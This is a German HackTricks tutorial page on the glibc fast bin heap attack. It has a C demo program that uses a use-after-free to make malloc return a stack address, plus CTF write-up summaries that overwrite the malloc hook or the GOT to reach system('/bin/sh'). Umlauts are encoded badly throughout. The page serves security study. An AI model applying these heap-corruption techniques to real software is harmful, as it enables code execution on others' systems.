# Schneller Bin-Angriff

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## Grundlegende Informationen

F√ºr weitere Informationen dar√ºber, was ein schneller Bin ist, besuchen Sie diese Seite:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Da der schnelle Bin einfach verkettet ist, gibt es viel weniger Schutzma√ünahmen als in anderen Bins, und es reicht aus, **eine Adresse in einem freigegebenen schnellen Bin-Chunk zu √§ndern**, um sp√§ter einen Chunk in einer beliebigen Speicheradresse zu **allokieren**.

Zusammenfassend:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Sie k√∂nnen ein vollst√§ndiges Beispiel in einem sehr gut erkl√§rten Code unter [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) finden:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Wenn es m√∂glich ist, den Wert der globalen Variablen **`global_max_fast`** mit einer gro√üen Zahl zu √ºberschreiben, erm√∂glicht dies das Generieren von Fast Bins mit gr√∂√üeren Gr√∂√üen, was potenziell erm√∂glicht, Fast Bin-Angriffe in Szenarien durchzuf√ºhren, in denen dies zuvor nicht m√∂glich war.
{% endhint %}

## Beispiele

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Es ist m√∂glich, Chunks zu allozieren, sie freizugeben, ihren Inhalt zu lesen und sie zu f√ºllen (mit einer √úberlaufschwachstelle).
* **Konsolidierung von Chunks f√ºr Infoleak**: Die Technik besteht im Wesentlichen darin, den √úberlauf zu missbrauchen, um eine gef√§lschte `prev_size` zu erstellen, sodass ein vorheriger Chunk in einen gr√∂√üeren Chunk gelegt wird. Beim Allozieren des gr√∂√üeren Chunks, der einen anderen Chunk enth√§lt, ist es m√∂glich, dessen Daten zu drucken und eine Adresse an libc zu leaken (`main_arena+88`).
* **√úberschreiben des malloc-Hooks**: Durch Ausnutzen der vorherigen √úberlappungssituation war es m√∂glich, 2 Chunks zu haben, die auf denselben Speicher zeigten. Daher war es m√∂glich, beide freizugeben (wobei ein anderer Chunk dazwischen freigegeben wurde, um Schutzmechanismen zu umgehen). Es war dann m√∂glich, denselben Chunk zweimal im Fast Bin zu haben. Anschlie√üend war es m√∂glich, ihn erneut zu allozieren, die Adresse zum n√§chsten Chunk zu √ºberschreiben, um etwas vor dem malloc-Hook zu zeigen (damit es auf ein Integer zeigt, das malloc f√ºr eine freie Gr√∂√üe h√§lt - ein weiterer Umgehungsweg), ihn erneut zu allozieren und dann einen anderen Chunk zu allozieren, der eine Adresse zu malloc-Hooks erhalten wird. Schlie√ülich wurde ein **One-Gadget** dort geschrieben.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Es gibt einen Heap-√úberlauf und Benutzer-nach-Free sowie Double-Free, weil es m√∂glich ist, einen Chunk wiederzuverwenden und die Zeiger erneut freizugeben.
* **Libc-Infoleak**: Einfach einige Chunks freigeben, und sie erhalten einen Zeiger auf einen Teil des Hauptarena-Speicherorts. Da freigegebene Zeiger wiederverwendet werden k√∂nnen, kann diese Adresse einfach gelesen werden.
* **Fast Bin-Angriff**: Alle Zeiger auf die Allokationen werden in einem Array gespeichert. Daher k√∂nnen wir ein paar Fast Bin-Chunks freigeben und im letzten den Zeiger √ºberschreiben, um etwas vor diesem Array von Zeigern zu zeigen. Anschlie√üend k√∂nnen ein paar Chunks mit derselben Gr√∂√üe alloziert werden, wobei wir zuerst den legitimen und dann den gef√§lschten erhalten, der das Array von Zeigern enth√§lt. Jetzt k√∂nnen wir diese Allokationszeiger √ºberschreiben, um auf die GOT-Adresse von `free` zu zeigen, um auf `system` zu zeigen, und dann Chunk 1 `"/bin/sh"` schreiben, um dann `free(chunk1)` auszuf√ºhren, was `system("/bin/sh")` ausf√ºhrt.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Ein weiteres Beispiel f√ºr den Missbrauch eines 1B-√úberlaufs, um Chunks im unsortierten Bin zu konsolidieren und einen libc-Infoleak zu erhalten und dann einen Fast Bin-Angriff durchzuf√ºhren, um den malloc-Hook mit einer One-Gadget-Adresse zu √ºberschreiben.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Nach einem Infoleak durch den Missbrauch des unsortierten Bins mit einem UAF, um eine libc-Adresse und eine PIE-Adresse zu leaken, nutzte der Exploit dieses CTF einen Fast Bin-Angriff, um einen Chunk an einem Ort zu allozieren, an dem die Zeiger auf kontrollierte Chunks lagen. Dadurch war es m√∂glich, bestimmte Zeiger zu √ºberschreiben, um eine One-Gadget in der GOT zu schreiben.
* Sie k√∂nnen einen Fast Bin-Angriff durch den Missbrauch eines unsortierten Bin-Angriffs finden:
* Beachten Sie, dass es √ºblich ist, bevor Fast Bin-Angriffe durchgef√ºhrt werden, die ungeliebte Liste zu missbrauchen, um libc-/Heap-Adressen zu leaken (wenn n√∂tig).

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
